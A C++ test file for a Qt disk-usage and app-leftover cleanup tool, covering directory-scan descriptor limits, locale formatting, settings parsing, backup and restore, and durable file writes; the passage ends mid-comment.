static int checkDeferredFdBound() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "fd bound: temp dir failed\n");
        return 1;
    }
    const QString root = tmp.path();
    const int dirCount = 400;
    for (int i = 0; i < dirCount; ++i) {
        const QString sub = QStringLiteral("%1/d%2").arg(root).arg(i);
        if (!QDir().mkpath(sub)) {
            std::fprintf(stderr, "fd bound: mkpath %d failed\n", i);
            return 1;
        }
        if (writeFile(sub + QStringLiteral("/f.bin"), QByteArray(4096, 'x'))) {
            std::fprintf(stderr, "fd bound: write %d failed\n", i);
            return 1;
        }
    }
    const int before = openDescriptorCount();
    if (before < 0) {
        std::fprintf(stdout, "fd bound: no /proc/self/fd, skipped\n");
        return 0;
    }
    FdProbe probe;
    DiskScanOptions opts;
    opts.oneFileSystem = true;
    opts.dirDone = &noteDescriptors;
    opts.user = &probe;
    DiskNode *tree = scanDiskTree(root, opts);
    if (!tree || tree->unreadable) {
        std::fprintf(stderr, "fd bound: scan produced no tree\n");
        delete tree;
        return 1;
    }
    if (tree->children.size() != dirCount) {
        std::fprintf(stderr, "fd bound: got %lld children, want %d\n",
            static_cast<long long>(tree->children.size()), dirCount);
        delete tree;
        return 1;
    }
    qint64 perDir = 0;
    for (const DiskNode *c : tree->children) {
        if (!c->isDir) continue;
        perDir += c->apparent;
    }
    if (perDir < qint64(dirCount) * 4096) {
        std::fprintf(stderr, "fd bound: deferred totals lost (%lld of %lld)\n",
            static_cast<long long>(perDir), static_cast<long long>(dirCount) * 4096);
        delete tree;
        return 1;
    }
    delete tree;
    /* The deferred pool (kMaxDeferredDirFds), the workers walking at the same
       time, and the descriptors the test already held. An uncapped deferral
       reaches one per directory instead, which is what this pins. */
    const int slack = before + 64 + 8 + 16;
    if (probe.peak.loadAcquire() > slack) {
        std::fprintf(stderr, "fd bound: %d descriptors open mid-walk, limit %d\n",
            probe.peak.loadAcquire(), slack);
        return 1;
    }
    std::fprintf(stdout, "fd bound: ok (peak %d, limit %d)\n", probe.peak.loadAcquire(), slack);
    return 0;
}

static int checkDiskTreeCollation() {
    // Rows of one size are ordered by name, and a German or Swedish reader
    // expects dictionary order: code units put "Zebra" ahead of "apple" and
    // "Äpfel" behind every ASCII name. The default locale is what `QLocale()`
    // and so `sortChildren` reads, so setting it here is what a German window
    // would see.
    const QLocale saved = QLocale();
    QLocale::setDefault(QLocale(QLocale::German, QLocale::Germany));
    DiskNode root;
    const char *names[] = {"Zebra", "Äpfel", "apple"};
    for (const char *name : names) {
        auto *child = new DiskNode;
        child->name = QString::fromUtf8(name);
        child->path = QStringLiteral("/tmp/") + child->name;
        child->apparent = 10;
        child->allocated = 10;
        root.children.append(child);
    }
    root.sortChildren(false);
    QStringList order;
    for (const DiskNode *c : root.children) order.append(c->name);
    QLocale::setDefault(saved);
    if (order != QStringList({QString::fromUtf8("Äpfel"), QStringLiteral("apple"),
                              QStringLiteral("Zebra")})) {
        std::fprintf(stderr, "disk: German tree order is %s\n",
            qPrintable(order.join(QLatin1Char(','))));
        return 1;
    }
    return 0;
}

static int checkLocaleGrouping() {
    // A count inside a sentence carries the locale's own grouping, so 1234567
    // reads "1.234.567" in German instead of a bare "1234567" inside a German
    // message. The expectation is read back from the locale rather than
    // hardcoded, so the check still holds on a build whose CLDR data has no
    // German rules and falls back to the C locale's digits.
    const QLocale german(QLocale::German, QLocale::Germany);
    const QLocale saved = QLocale();
    QLocale::setDefault(german);
    const QString grouped = localeCount(1234567);
    const QString negative = localeCount(-1234);
    QLocale::setDefault(QLocale::C);
    const QString plain = localeCount(1234567);
    QLocale::setDefault(saved);
    if (grouped != german.toString(Q_INT64_C(1234567))) {
        std::fprintf(stderr, "count: German grouping is %s, want %s\n",
            qPrintable(grouped), qPrintable(german.toString(Q_INT64_C(1234567))));
        return 1;
    }
    if (negative != german.toString(Q_INT64_C(-1234))) {
        std::fprintf(stderr, "count: German negative count is %s\n", qPrintable(negative));
        return 1;
    }
    if (plain != QStringLiteral("1234567")) {
        std::fprintf(stderr, "count: the C locale must not group (%s)\n", qPrintable(plain));
        return 1;
    }
    return 0;
}

/// A size fraction carries the locale's own digits and separator, not the C
/// locale's. Both used to come out of `QString::number` with only the decimal
/// point swapped, so an Arabic or Farsi window printed "1.5 MB" in Latin digits
/// while the count beside it printed in Arabic-Indic ones, and a German window
/// printed "1.5 MB" where a decimal comma belongs.
///
/// The expectation is read back from the locale rather than hardcoded, so the
/// check still holds on a build whose CLDR data has no entry and falls back to
/// the C locale's digits.
static int checkSizeLocaleDigits() {
    struct Case { QLocale::Language lang; QLocale::Country country; };
    const Case cases[] = {
        {QLocale::C, QLocale::AnyCountry},
        {QLocale::German, QLocale::Germany},
        {QLocale::Arabic, QLocale::Egypt},
        {QLocale::Persian, QLocale::Iran},
    };
    for (const Case &c : cases) {
        const QLocale loc(c.lang, c.country);
        const QLocale saved = QLocale();
        QLocale::setDefault(loc);
        const QString size = humanSize(1024LL * 1024LL);
        QLocale::setDefault(saved);
        // Rebuild the expectation the way the label is built: the locale's
        // `toString`, minus the grouping a size column must not carry.
        QString want = loc.toString(1.0, 'f', 1);
        const QString group = loc.groupSeparator();
        if (!group.isEmpty()) want.remove(group);
        want += QLatin1String(" MB");
        if (size != want) {
            std::fprintf(stderr, "size: %s printed %s, want %s\n",
                qPrintable(loc.name()), qPrintable(size), qPrintable(want));
            return 1;
        }
    }
    // A locale whose digits are not ASCII must actually reach a different
    // label, or the loop above is passing for the wrong reason: it compares
    // each locale against itself and would agree even if every one of them
    // printed ASCII.
    const QLocale arabic(QLocale::Arabic, QLocale::Egypt);
    const QLocale latin(QLocale::C, QLocale::AnyCountry);
    if (arabic.zeroDigit() != latin.zeroDigit()) {
        const QLocale saved = QLocale();
        QLocale::setDefault(arabic);
        const QString arabicSize = humanSize(1024LL * 1024LL);
        QLocale::setDefault(latin);
        const QString latinSize = humanSize(1024LL * 1024LL);
        QLocale::setDefault(saved);
        if (arabicSize == latinSize) {
            std::fprintf(stderr, "size: Arabic and Latin labels agree (%s)\n",
                qPrintable(arabicSize));
            return 1;
        }
    }
    return 0;
}

static int checkDiskUsage() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "disk: temp dir failed\n");
        return 1;
    }
    const QString root = tmp.path();
    const QString sub = root + QStringLiteral("/big");
    if (!QDir().mkpath(sub)) {
        std::fprintf(stderr, "disk: mkpath failed\n");
        return 1;
    }
    const QByteArray payload(4096, 'x');
    if (writeFile(sub + QStringLiteral("/a.bin"), payload)
        || writeFile(root + QStringLiteral("/small.txt"), QByteArray("hi\n"))) {
        std::fprintf(stderr, "disk: write failed\n");
        return 1;
    }
    const QString linkDir = root + QStringLiteral("/linkdir");
    if (!QFile::link(sub, linkDir)) {
        std::fprintf(stderr, "disk: symlink failed\n");
        return 1;
    }

    DiskScanOptions opts;
    opts.oneFileSystem = true;
    DiskNode *tree = scanDiskTree(root, opts);
    if (!tree || tree->unreadable || tree->children.size() < 2) {
        std::fprintf(stderr, "disk: scan produced no children\n");
        delete tree;
        return 1;
    }
    const DiskNode *big = nullptr;
    const DiskNode *small = nullptr;
    const DiskNode *link = nullptr;
    for (const DiskNode *c : tree->children) {
        if (c->name == QLatin1String("big")) big = c;
        if (c->name == QLatin1String("small.txt")) small = c;
        if (c->name == QLatin1String("linkdir")) link = c;
    }
    if (!big || !big->isDir || big->apparent < 4096) {
        std::fprintf(stderr, "disk: big dir apparent size missing\n");
        delete tree;
        return 1;
    }
    if (!small || small->isDir || small->apparent < 3) {
        std::fprintf(stderr, "disk: small file missing\n");
        delete tree;
        return 1;
    }
    if (measurePathBytes(sub) < 4096) {
        std::fprintf(stderr, "disk: measurePathBytes missed the 4096-byte file\n");
        delete tree;
        return 1;
    }
    if (!link || link->isDir) {
        std::fprintf(stderr, "disk: directory symlink was followed\n");
        delete tree;
        return 1;
    }
    if (tree->apparent < big->apparent || tree->items < 3) {
        std::fprintf(stderr, "disk: root totals too small\n");
        delete tree;
        return 1;
    }
    tree->sortChildren(false);
    if (tree->children.isEmpty() || tree->children[0]->name != QLatin1String("big")) {
        std::fprintf(stderr, "disk: sort by apparent did not put big first\n");
        delete tree;
        return 1;
    }
    delete tree;
    tree = nullptr;

    const QString many = root + QStringLiteral("/many");
    if (!QDir().mkpath(many)) {
        std::fprintf(stderr, "disk: many mkpath failed\n");
        return 1;
    }
    for (int i = 0; i < 200; ++i) {
        const QString n = QStringLiteral("%1/f%2.txt").arg(many).arg(i);
        if (writeFile(n, QByteArray("x\n"))) {
            std::fprintf(stderr, "disk: many write failed\n");
            return 1;
        }
    }
    tree = scanDiskTree(root, opts);
    if (!tree || tree->unreadable) {
        std::fprintf(stderr, "disk: rescan after many files failed\n");
        delete tree;
        return 1;
    }
    const DiskNode *manyNode = nullptr;
    for (const DiskNode *c : tree->children) {
        if (c->name == QLatin1String("many")) manyNode = c;
    }
    if (!manyNode || !manyNode->isDir || manyNode->children.size() < 200) {
        std::fprintf(stderr, "disk: getdents listing missed files (%d)\n",
            manyNode ? int(manyNode->children.size()) : -1);
        delete tree;
        return 1;
    }
    const QString linkRoot = root + QStringLiteral("/rootlink");
    if (!QFile::link(sub, linkRoot)) {
        std::fprintf(stderr, "disk: root symlink failed\n");
        delete tree;
        return 1;
    }
    delete tree;
    tree = scanDiskTree(linkRoot, opts);
    if (!tree || tree->unreadable || tree->children.isEmpty()) {
        std::fprintf(stderr, "disk: scan of directory symlink root failed\n");
        delete tree;
        return 1;
    }
    bool sawBin = false;
    for (const DiskNode *c : tree->children) {
        if (c->name == QLatin1String("a.bin")) sawBin = true;
    }
    if (!sawBin) {
        std::fprintf(stderr, "disk: symlink root did not follow to contents\n");
        delete tree;
        return 1;
    }
    delete tree;

    const QVector<DiskVolume> vols = listDiskVolumes();
    bool hasRoot = false;
    for (const DiskVolume &v : vols) {
        if (v.isRoot && v.bytesTotal > 0) hasRoot = true;
        // "/" + "/" is "//", so the root volume only counts as home if the
        // comparison special-cases it.
        if (v.isRoot && !v.isHome) {
            std::fprintf(stderr, "disk: root volume not marked isHome\n");
            return 1;
        }
        if (v.rootPath == QLatin1String("/proc")) {
            std::fprintf(stderr, "disk: listed virtual /proc\n");
            return 1;
        }
        if (v.fileSystem.toLower() == QLatin1String("tmpfs")
            && v.rootPath != QLatin1String("/")
            && !v.isHome) {
            std::fprintf(stderr, "disk: listed tmpfs %s\n", v.rootPath.toUtf8().constData());
            return 1;
        }
        if (v.rootPath == QLatin1String("/run")
            || v.rootPath.startsWith(QLatin1String("/run/"))) {
            std::fprintf(stderr, "disk: listed /run mount %s\n", v.rootPath.toUtf8().constData());
            return 1;
        }
    }
    if (!hasRoot) {
        std::fprintf(stderr, "disk: file system volume missing\n");
        return 1;
    }
    if (diskContentsLabel(1, true) != QLatin1String("Empty")) {
        std::fprintf(stderr, "disk: empty contents label\n");
        return 1;
    }
    if (diskContentsLabel(5, true) != localeCount(4) + QLatin1String(" items")) {
        std::fprintf(stderr, "disk: items label\n");
        return 1;
    }
    const int collation = checkDiskTreeCollation();
    if (collation != 0) return collation;
    std::fprintf(stdout, "disk: ok\n");
    return 0;
}

/// The scan token is read by the window thread and by the leftover-size pool
/// while the scan thread writes it, so it has to be atomic: a plain int there
/// is a data race, and a cancel that lands mid-scan can compare against a
/// stale token and miss the run it meant to stop. Nothing here compiles or
/// walks anything, `run` with no plugins is rejected by the host before it
/// builds an engine, so this is a threading test, not a scan.
static int checkScanWorkerToken() {
    ScanWorker worker;
    /* A run that took the wanted token is not cancelled, and the window's
       token changes are what tell an older run to stop. The writer side: the
       run stores the token it was given, the window thread moves the wanted
       one, and the pool polls the pair. */
    worker.setWanted(1);
    worker.run(QStringLiteral("/nonexistent/appattic_core.wasm"), QStringList(), 1);
    if (worker.isCancelled()) {
        std::fprintf(stderr, "scan worker: a run of the wanted token reads as cancelled\n");
        return 1;
    }
    std::atomic<bool> done{false};
    std::thread window([&worker, &done] {
        for (int i = 1; i <= 20000 && !done.load(std::memory_order_relaxed); ++i) {
            if (i % 3 == 0) {
                worker.requestCancel();
            } else {
                worker.setWanted(i | 1);
            }
        }
        done.store(true, std::memory_order_relaxed);
    });
    for (int i = 0; i < 300; ++i) {
        worker.setWanted(1);
        worker.run(QStringLiteral("/nonexistent/appattic_core.wasm"), QStringList(), 1);
    }
    window.join();
    worker.requestCancel();
    if (!worker.isCancelled()) {
        std::fprintf(stderr, "scan worker: requestCancel did not cancel\n");
        return 1;
    }
    std::fprintf(stdout, "scan worker: ok\n");
    return 0;
}

static int checkScanCache() {
    /* The path has to be the one the CLI and the macOS UI write, or dropping
       it here leaves their snapshot in place. */
    const QString path = scanCacheFilePath();
    if (!path.endsWith(QLatin1String("appattic/last-scan.json"))) {
        std::fprintf(stderr, "scan cache: unexpected path (%s)\n", qPrintable(path));
        return 1;
    }
    if (QFileInfo(path).dir() != QFileInfo(settingsFilePath()).dir()) {
        std::fprintf(stderr, "scan cache: not beside the settings file\n");
        return 1;
    }
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "scan cache: temp dir failed\n");
        return 1;
    }
    const QString file = tmp.filePath(QStringLiteral("last-scan.json"));
    /* A snapshot that is not there is the state a cleanup wants, so removing
       one that was never written cannot report failure. */
    if (!removeScanCacheFile(file)) {
        std::fprintf(stderr, "scan cache: removing a missing file failed\n");
        return 1;
    }
    if (writeFile(file, QByteArray("{}"))) {
        std::fprintf(stderr, "scan cache: write failed\n");
        return 1;
    }
    if (!removeScanCacheFile(file) || QFile::exists(file)) {
        std::fprintf(stderr, "scan cache: file survived removal\n");
        return 1;
    }
    std::fprintf(stdout, "scan cache: ok\n");
    return 0;
}

static int checkSettings() {
    // A legacy value that is not a boolean must not become the default: the
    // migration would write that default back as the user's setting.
    bool readable = false;
    if (!legacyBoolValue(QVariant(true), false, &readable) || !readable) {
        std::fprintf(stderr, "settings: legacy bool QVariant(true)\n");
        return 1;
    }
    for (const char *on : {"true", "1", "yes", "YES", " true "}) {
        if (!legacyBoolValue(QVariant(QString::fromLatin1(on)), false, &readable) || !readable) {
            std::fprintf(stderr, "settings: legacy bool on spelling %s\n", on);
            return 1;
        }
    }
    for (const char *off : {"false", "0", "no", "No"}) {
        if (legacyBoolValue(QVariant(QString::fromLatin1(off)), true, &readable) || !readable) {
            std::fprintf(stderr, "settings: legacy bool off spelling %s\n", off);
            return 1;
        }
    }
    // The `!` this line used to carry made it ask the opposite question: an
    // unreadable value that returned its fallback, which is the contract, read
    // as a failure, so the check failed on correct behaviour.
    if (legacyBoolValue(QVariant(QStringLiteral("maybe")), true, &readable) != true
        || legacyBoolValue(QVariant(QStringLiteral("maybe")), false, &readable) != false
        || readable) {
        std::fprintf(stderr, "settings: unreadable legacy value was not reported\n");
        return 1;
    }

    AppSettings s;
    QString err;
    const QByteArray raw = R"({"confirmDelete":false,"ignoredLeftoverPaths":["/a","/a"],"includeSystem":true})";
    if (!parseSettingsJson(raw, &s, &err) || s.confirmDelete || !s.includeSystem
        || s.ignoredLeftoverPaths != QStringList{QStringLiteral("/a")}) {
        std::fprintf(stderr, "settings: valid settings.json not parsed (%s)\n", qPrintable(err));
        return 1;
    }
    for (const QByteArray &bad : {
             QByteArray(""),
             QByteArray("not json"),
             QByteArray("[]"),
             QByteArray(R"({"confirmDelete":"no"})"),
             QByteArray(R"({"unknownKey":true})"),
             QByteArray(R"({"ignoredLeftoverPaths":[1]})"),
             // A relative or `~` entry matches no reported leftover path, so it
             // hides nothing. The Swift loader refuses it; so does this one.
             QByteArray(R"({"ignoredLeftoverPaths":["~/.cache/Whisky"]})"),
             QByteArray(R"({"ignoredLeftoverPaths":["Whisky"]})"),
             // A trailing slash is the same entry spelled differently, so it
             // matches no reported path either. The Swift loader refuses it.
             QByteArray(R"({"ignoredLeftoverPaths":["/home/u/.cache/Whisky/"]})"),
         }) {
        if (parseSettingsJson(bad, &s, &err)) {
            std::fprintf(stderr, "settings: bad settings.json accepted: %s\n", bad.constData());
            return 1;
        }
    }
    std::fprintf(stdout, "settings: ok\n");
    return 0;
}

/// The state before a settings write has to outlive it: the ignore list is
/// the user's own choices and a scan cannot rebuild them, so replacing
/// settings.json keeps the file it replaced as settings.json.bak, as private
/// as the file it was copied from.
static int checkSettingsBackup() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "settings backup: temp dir failed\n");
        return 1;
    }
    const QString path = tmp.filePath(QStringLiteral("settings.json"));
    if (writeFile(path, encodeSettingsJson(AppSettings()))) {
        std::fprintf(stderr, "settings backup: write failed\n");
        return 1;
    }
    if (QFile::exists(settingsBackupPath(path))) {
        std::fprintf(stderr, "settings backup: nothing to keep, and a backup appeared\n");
        return 1;
    }
    // persistSettings keeps the file it is about to replace, then writes the
    // new one, so the backup holds the state *before* this write. The call
    // order here is the one in main.cpp: back up, then overwrite.
    if (!keepSettingsBackup(path)) {
        std::fprintf(stderr, "settings backup: copy did not land\n");
        return 1;
    }
    AppSettings ignored;
    ignored.ignoredLeftoverPaths = QStringList{QStringLiteral("/a")};
    if (writeFile(path, encodeSettingsJson(ignored))) {
        std::fprintf(stderr, "settings backup: second write failed\n");
        return 1;
    }
    QFile backupFile(settingsBackupPath(path));
    AppSettings kept;
    QString err;
    if (!backupFile.open(QIODevice::ReadOnly)
        || !parseSettingsJson(backupFile.readAll(), &kept, &err)
        || kept.ignoredLeftoverPaths != QStringList{}) {
        std::fprintf(stderr, "settings backup: the backup is not the file it replaced (%s)\n", qPrintable(err));
        return 1;
    }
    const QFile::Permissions perms = QFileInfo(settingsBackupPath(path)).permissions();
    if (perms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
            | QFileDevice::WriteGroup | QFileDevice::WriteOther)) {
        std::fprintf(stderr, "settings backup: the backup is group/other readable\n");
        return 1;
    }
    std::fprintf(stdout, "settings backup: ok\n");
    return 0;
}

/// persistSettings runs on every toggle and a double click reaches the handler
/// twice, so a save that changed nothing is a normal event. keepSettingsBackup
/// copies the file as it stands and skips when the backup already holds those
/// bytes, so backing up after a write is stable: re-saving the same state
/// leaves the backup where the last write put it.
static int checkSettingsBackupRepeatedSave() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "settings rerun: temp dir failed\n");
        return 1;
    }
    const QString path = tmp.filePath(QStringLiteral("settings.json"));
    AppSettings first;
    first.ignoredLeftoverPaths = QStringList{QStringLiteral("/first")};
    AppSettings second;
    second.ignoredLeftoverPaths = QStringList{QStringLiteral("/second")};
    // keepSettingsBackup backs up the file as it stands and skips when the
    // backup already holds those bytes, so writing first and then backing up is
    // the self-consistent order for this check: the first save moves the
    // backup to `first`, and a save that changes nothing leaves it there
    // because the file it would copy already matches.
    if (writeFile(path, encodeSettingsJson(first)) || !keepSettingsBackup(path)) {
        std::fprintf(stderr, "settings rerun: first write failed\n");
        return 1;
    }
    if (writeFile(path, encodeSettingsJson(second)) || !keepSettingsBackup(path)) {
        std::fprintf(stderr, "settings rerun: second write failed\n");
        return 1;
    }
    QFile backupFile(settingsBackupPath(path));
    AppSettings kept;
    QString err;
    if (!backupFile.open(QIODevice::ReadOnly)
        || !parseSettingsJson(backupFile.readAll(), &kept, &err)
        || kept.ignoredLeftoverPaths != second.ignoredLeftoverPaths) {
        std::fprintf(stderr, "settings rerun: the backup is not the last write (%s)\n", qPrintable(err));
        return 1;
    }
    // The same bytes again, three times: what the backup holds must not move.
    for (int i = 0; i < 3; ++i) {
        if (writeFile(path, encodeSettingsJson(second)) || !keepSettingsBackup(path)) {
            std::fprintf(stderr, "settings rerun: repeated write failed\n");
            return 1;
        }
    }
    // A QFile is not re-openable, so the second read gets its own handle.
    QFile afterRerun(settingsBackupPath(path));
    if (!afterRerun.open(QIODevice::ReadOnly)
        || !parseSettingsJson(afterRerun.readAll(), &kept, &err)
        || kept.ignoredLeftoverPaths != second.ignoredLeftoverPaths) {
        std::fprintf(stderr, "settings rerun: a save that changed nothing moved the backup (%s)\n", qPrintable(err));
        return 1;
    }
    // A save that does change something keeps the file it was holding: the
    // backup follows the last write, which is what persistSettings relies on
    // when it backs up before overwriting.
    AppSettings third;
    third.ignoredLeftoverPaths = QStringList{QStringLiteral("/third")};
    if (writeFile(path, encodeSettingsJson(third)) || !keepSettingsBackup(path)) {
        std::fprintf(stderr, "settings rerun: third write failed\n");
        return 1;
    }
    QFile afterThird(settingsBackupPath(path));
    AppSettings replaced;
    if (!afterThird.open(QIODevice::ReadOnly)
        || !parseSettingsJson(afterThird.readAll(), &replaced, &err)
        || replaced.ignoredLeftoverPaths != third.ignoredLeftoverPaths) {
        std::fprintf(stderr, "settings rerun: a changed save did not keep what it replaced (%s)\n", qPrintable(err));
        return 1;
    }
    std::fprintf(stdout, "settings rerun: ok\n");
    return 0;
}

/// The recovery the backup exists for, as the window runs it. The backup is the
/// only copy of the ignore list once settings.json stops reading, so the
/// restore is the one destructive step taken on a machine that is already
/// broken, and three things have to hold: a backup that reads is put back, a
/// backup that does not read changes nothing at all, and the file a restore
/// replaced is still on disk afterwards.
static int checkSettingsRestore() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "settings restore: temp dir failed\n");
        return 1;
    }
    const QString path = tmp.filePath(QStringLiteral("settings.json"));
    const QByteArray broken = QByteArrayLiteral("{ \"ignoredLeftoverPaths\": ");

    /* A backup the loader refuses is reported and changes nothing: not the
       settings file, which a user may still be able to read by hand, and not
       the kept copy. Each of these is a way the backup itself gets truncated
       or mangled, which is the whole reason to check it. */
    const char *unusable[] = {
        "",
        "{ \"ignoredLeftoverPaths\": ",
        "{ \"unknownKey\": 1 }",
        "{ \"confirmDelete\": \"yes\" }",
        "{ \"ignoredLeftoverPaths\": [\"relative/path\"] }",
        "{ \"ignoredLeftoverPaths\": [\"/tmp/Trailing/\"] }",
    };
    for (const char *bad : unusable) {
        if (writeFile(path, broken)) {
            std::fprintf(stderr, "settings restore: could not stage the broken file\n");
            return 1;
        }
        if (writeFile(settingsBackupPath(path), QByteArray(bad))) {
            std::fprintf(stderr, "settings restore: could not stage the bad backup\n");
            return 1;
        }
        QString err;
        if (restoreSettingsBackup(path, &err)) {
            std::fprintf(stderr, "settings restore: a backup that does not read was restored: %s\n", bad);
            return 1;
        }
        if (err.isEmpty()) {
            std::fprintf(stderr, "settings restore: a refused restore gave no reason: %s\n", bad);
            return 1;
        }
        QFile kept(path);
        if (!kept.open(QIODevice::ReadOnly) || kept.readAll() != broken) {
            std::fprintf(stderr, "settings restore: a refused restore changed settings.json: %s\n", bad);
            return 1;
        }
        if (QFile::exists(settingsRejectedPath(path))) {
            std::fprintf(stderr, "settings restore: a refused restore kept a .bad file: %s\n", bad);
            return 1;
        }
    }

    /* The ordinary case: a backup that reads is put back, and the file it
       replaced is kept as settings.json.bad so a restore that turns out to be
       the wrong state is not a second loss on a machine that already lost the
       first. */
    AppSettings wanted;
    wanted.ignoredLeftoverPaths = QStringList{QStringLiteral("/second")};
    if (writeFile(settingsBackupPath(path), encodeSettingsJson(wanted))) {
        std::fprintf(stderr, "settings restore: could not stage the good backup\n");
        return 1;
    }
    QString err;
    if (!restoreSettingsBackup(path, &err)) {
        std::fprintf(stderr, "settings restore: a good backup was not restored (%s)\n", qPrintable(err));
        return 1;
    }
    AppSettings got;
    if (!parseSettingsJson(readFile(path), &got, &err)
        || got.ignoredLeftoverPaths != wanted.ignoredLeftoverPaths) {
        std::fprintf(stderr, "settings restore: the restored file is not the backup (%s)\n", qPrintable(err));
        return 1;
    }
    QFile replaced(settingsRejectedPath(path));
    if (!replaced.open(QIODevice::ReadOnly) || replaced.readAll() != broken) {
        std::fprintf(stderr, "settings restore: the file the restore replaced was not kept\n");
        return 1;
    }
    /* The kept file carries the account's own paths, so it is as private as the
       file it was copied from. */
    const QFile::Permissions perms = QFileInfo(settingsRejectedPath(path)).permissions();
    if (perms & (QFileDevice::ReadGroup | QFileDevice::ReadOther)) {
        std::fprintf(stderr, "settings restore: settings.json.bad is readable by others\n");
        return 1;
    }
    /* A second restore changes nothing, so it must not keep a copy of the file
       that is already in place and lose the one it already had. */
    if (!restoreSettingsBackup(path, &err)) {
        std::fprintf(stderr, "settings restore: the second restore failed (%s)\n", qPrintable(err));
        return 1;
    }
    QFile stillThere(settingsRejectedPath(path));
    if (!stillThere.open(QIODevice::ReadOnly) || stillThere.readAll() != broken) {
        std::fprintf(stderr, "settings restore: a restore that changed nothing replaced the kept file\n");
        return 1;
    }

    /* No backup at all is reported rather than turned into a defaults file:
       an empty file here would look like a successful restore of nothing. */
    QTemporaryDir empty;
    if (!empty.isValid()) {
        std::fprintf(stderr, "settings restore: temp dir failed\n");
        return 1;
    }
    const QString bare = empty.filePath(QStringLiteral("settings.json"));
    if (writeFile(bare, broken) || restoreSettingsBackup(bare, &err) || err.isEmpty()) {
        std::fprintf(stderr, "settings restore: a missing backup was not reported\n");
        return 1;
    }
    QFile untouched(bare);
    if (!untouched.open(QIODevice::ReadOnly) || untouched.readAll() != broken) {
        std::fprintf(stderr, "settings restore: a missing backup changed settings.json\n");
        return 1;
    }

    std::fprintf(stdout, "settings restore: ok\n");
    return 0;
}

/// A save is only a save once the bytes are on disk: the rename that publishes
/// the file does not flush it, so a crash between the two leaves a correctly
/// named settings.json holding a truncated write. The write reports failure
/// rather than success when it cannot finish, it never leaves a file that is
/// neither the old state nor the new one, and it does not publish the file at
/// the umask default on the way past.
static int checkDurableWrite() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "durable write: temp dir failed\n");
        return 1;
    }
    const QString path = tmp.filePath(QStringLiteral("settings.json"));
    AppSettings first;
    first.ignoredLeftoverPaths = QStringList{QStringLiteral("/first")};
    if (writeFile(path, encodeSettingsJson(first))) {
        std::fprintf(stderr, "durable write: the starting file was not written\n");
        return 1;
    }
    AppSettings second;
    second.ignoredLeftoverPaths = QStringList{QStringLiteral("/second")};
    if (!writeDurableFile(encodeSettingsJson(second), path)) {
        std::fprintf(stderr, "durable write: the write did not land\n");
        return 1;
    }
    QFile written(path);
    AppSettings s;
    QString err;
    if (!written.open(QIODevice::ReadOnly)
        || !parseSettingsJson(written.readAll(), &s, &err)
        || s.ignoredLeftoverPaths != second.ignoredLeftoverPaths) {
        std::fprintf(stderr, "durable write: the file is not what was written (%s)\n", qPrintable(err));
        return 1;
    }
    const QFile::Permissions perms = QFileInfo(path).permissions();
    if (perms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
            | QFileDevice::WriteGroup | QFileDevice::WriteOther)) {
        std::fprintf(stderr, "durable write: the file is group/other readable\n");
        return 1;
    }
    // A write that cannot be made is reported, and publishes nothing: the
    // state the caller still holds is the one on disk.
    const QString absent = tmp.filePath(QStringLiteral("no-such-dir/settings.json"));
    if (writeDurableFile(encodeSettingsJson(second), absent) || QFile::exists(absent)) {
        std::fprintf(stderr, "durable write: a write that could not land reported success\n");
        return 1;
    }
    std::fprintf(stdout, "durable write: ok\n");
    return 0;
}

/// The same durable write, at a path whose directory is not ASCII, and the
/// rename beside it.
///
/// `writeDurableFile` writes through `QSaveFile` and then reopens the path to
/// fsync it and to open the directory for the final rename. Qt encodes a file
/// name as UTF-8 on every platform this ships on, so both of those have to be
/// handed the *same* bytes, or the `::open` and `::mkdir` name a different
/// file than the one just written and the write reports itself durable when
/// nothing was flushed. A path that is only ASCII cannot tell the two
/// encodings apart, so this check writes into a directory whose name carries a
/// non-ASCII scalar and reads the result back.
///
/// It does not currently discriminate on every machine: `QString::toLocal8Bit`
/// returns UTF-8 wherever the system locale is UTF-8, which is the case for
/// every locale a CI runner normally has, and this suite has no latin-1 locale
/// to run under. It is here so a regression in the sync/rename path is caught
/// on a machine that does have one, and so the non-ASCII path keeps being
/// exercised at all; `syncWrittenFile` uses `toUtf8` for the reason above
/// whether or not this check can observe it.
static int checkDurableWriteNonASCIIPath() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "durable write (non-ascii): temp dir failed\n");
        return 1;
    }
    // U+00E9 precomposed followed by U+0301, so the directory name is both
    // non-ASCII and a spelling of a composed character that does not match it.
    const QString dir = tmp.filePath(QString::fromUtf8("writable-\xC3\xA9\xCC\x81"));
    if (!QDir().mkpath(dir)) {
        std::fprintf(stderr, "durable write (non-ascii): mkpath failed\n");
        return 1;
    }
    const QString path = QDir(dir).filePath(QStringLiteral("settings.json"));
    AppSettings first;
    first.ignoredLeftoverPaths = QStringList{QStringLiteral("/first")};
    if (writeFile(path, encodeSettingsJson(first))) {
        std::fprintf(stderr, "durable write (non-ascii): the starting file was not written\n");
        return 1;
    }
    AppSettings second;
    second.ignoredLeftoverPaths = QStringList{QStringLiteral("/second")};
    if (!writeDurableFile(encodeSettingsJson(second), path)) {
        std::fprintf(stderr, "durable write (non-ascii): the write did not land\n");
        return 1;
    }
    QFile written(path);
    AppSettings s;
    QString err;
    if (!written.open(QIODevice::ReadOnly)
        || !parseSettingsJson(written.readAll(), &s, &err)
        || s.ignoredLeftoverPaths != second.ignoredLeftoverPaths) {
        std::fprintf(stderr, "durable write (non-ascii): the file is not what was written (%s)\n",
                     qPrintable(err));
        return 1;
    }
    // The atomic replace leaves the target and nothing else. If the write path
    // and the sync/rename path disagreed on the encoding, the temp file is
    // still sitting there under the name the *other* encoding produced.
    const QStringList left = QDir(dir).entryList(QDir::Files | QDir::Hidden);
    if (left.size() != 1) {
        std::fprintf(stderr, "durable write (non-ascii): %d files left, expected 1 (%s)\n",
                     int(left.size()), qPrintable(left.join(QLatin1Char(','))));
        return 1;
    }
    std::fprintf(stdout, "durable write (non-ascii): ok\n");
    return 0;
}

/// A generated cleanup or update script is an executable holding the `rm`
